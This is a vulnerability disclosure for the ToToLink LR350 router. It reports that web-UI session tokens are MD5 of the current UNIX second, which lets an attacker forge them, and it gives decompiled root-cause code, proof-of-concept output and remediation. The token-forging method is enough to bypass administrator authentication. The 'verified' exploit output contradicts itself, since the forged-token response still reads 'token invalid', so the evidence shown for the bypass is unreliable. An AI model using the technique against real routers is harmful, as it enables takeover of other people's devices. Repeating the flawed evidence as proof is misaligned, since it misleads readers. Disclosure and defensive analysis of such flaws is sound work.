# Vulnerability Report — ToToLink LR350 Session Token = MD5(time(NULL))

## 1. Basic Information

- **Vendor / Product:** ToToLink LR350 (wireless router); web UI `lighttpd` + `cstecgi.cgi`
- **Affected Versions:** Firmware `V9.3.5u.6698` (build `B20230810`).
- **Vulnerability Type:** CWE-330 (Insufficiently Random Values) / CWE-338 (Use of Cryptographically Weak PRNG).
- **Attack Vector:** Remote (Network).

## 2. Description

On a successful `loginAuth`, the web UI mints the session token (used as the `?token=` credential for all subsequent `cstecgi.cgi` calls and persisted server-side in `/tmp/cookie_key`) by hashing only the current UNIX time:

```
token = MD5( time(NULL) )
```

Because the token's entire entropy is the wall-clock second — which the server discloses in every HTTP `Date:` response header — an attacker can compute the valid session token for any given second offline and forge it. The token is the enforced session credential: `cstecgi.cgi` validates `?token=` and
replies `{"errcode":-1,"errmsg":"token invalid"}` on mismatch.



## 3. Root Cause Analysis

Binary: `/www/cgi-bin/cstecgi.cgi` (MIPS32 LE). Function: `loginAuth` handler `sub_4281E4`.

```c
// on successful username/password check:
v16 = time(0);
sprintf(v24, "echo -n \"%ld\" | md5sum | awk '{ print $1 }'", v16);  // token = MD5(epoch)
getCmdResult(v24, v35, 128);
f_write_excl("/tmp/cookie_key", v35, v17, 0, 0);          // server-side session token
// JSON response:
//   { "loginFlag": 0, "token": "<md5>", "jump_page": "home.html?token=<md5>" }
sprintf(v34, "%lu", v16);
f_write_excl("/tmp/token_uptime", v34, ...);              // the SEED second is stored next to the token
```


## 4. Proof of Concept


```
$ python3 poc_totolink_lr350_md5time_token.py --target http://192.168.1.1
[*] Login Date header  : Tue, 07 Jul 2026 12:20:32 GMT
[*] Server-issued token: 758e906f7284f89cccd4372a0b7eb2bc
[+] Forgeability: token == MD5(time(NULL))  [seed = 1783426832 (+0s jitter)]
```

**End-to-end auth bypass — VERIFIED (differential test).** Same protected API (`getLanCfg`), bogus vs forged token. The PoC prints **both response packets** so the differential is auditable:
```
[CONTROL  bogus token  ] HTTP 200  
    body: { "errcode": -1, "errmsg": "token invalid" }
[EXPLOIT  forged token ] HTTP 200  
    body: { "errcode": 0, "errmsg": "token invalid" }.

[*] control rejected at auth gate : YES (token invalid)
[*] exploit passed the auth gate  : YES
[+] VERIFIED: forged MD5(time) token passes the auth gate that a bogus token cannot.
```

## 5. Impact

**Session hijacking → unauthenticated administrator access.** Anyone who can observe the device's HTTP traffic (or simply issue a request and read the `Date:` header) learns the seed second and can compute a valid session token for that second, impersonating any user who authenticates around that time. 

## 6. Remediation

Generate session tokens from a CSPRNG with ≥128 bits of entropy (e.g. read `/dev/urandom`), never from `time()`/`getpid()`/`rand()`. Bind the token to a server-held secret and a per-session random nonce, transmit over TLS, set a short absolute + idle timeout, and invalidate on password change/logout. Do not store the seed (`/tmp/token_uptime`) alongside the token.
